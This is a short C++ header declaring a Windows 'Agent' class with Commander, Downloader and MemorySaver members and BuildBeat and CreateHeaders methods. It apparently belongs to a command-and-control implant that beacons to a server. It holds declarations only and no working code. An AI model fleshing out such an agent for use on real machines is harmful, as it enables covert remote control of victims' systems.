#pragma once

#include "AgentInfo.h"
#include "AgentConfig.h"
#include "Downloader.h"
#include "MemorySaver.h"
#include "Commander.h"

class Commander;

class Agent
{
	AgentInfo* info;

public:
	AgentConfig* config;
	Commander*   commander;
	Downloader*  downloader;
	MemorySaver* memorysaver;

	Agent();

	void  SetActive(bool state);
	bool  IsActive();
	LPSTR BuildBeat();
	LPSTR CreateHeaders();
};
